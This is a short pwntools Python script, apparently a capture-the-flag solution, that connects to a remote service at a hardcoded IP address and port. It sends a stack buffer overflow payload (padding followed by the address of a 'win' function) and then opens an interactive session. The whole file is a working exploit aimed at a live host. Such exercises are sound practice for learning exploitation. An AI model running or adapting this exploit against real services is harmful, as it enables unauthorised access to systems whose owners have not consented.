from pwn import * 

binary = './program'

p = process(binary) 

p = remote("20.84.72.194", 5000)
s = '''
b * main+94
'''



#gdb.attach(p, s)

win = 0x00000000004011f6
payload = flat(
	b'A' * 0x40,
	b'B' * 8,
	p64(win)
)
p.sendline(payload)

p.interactive()
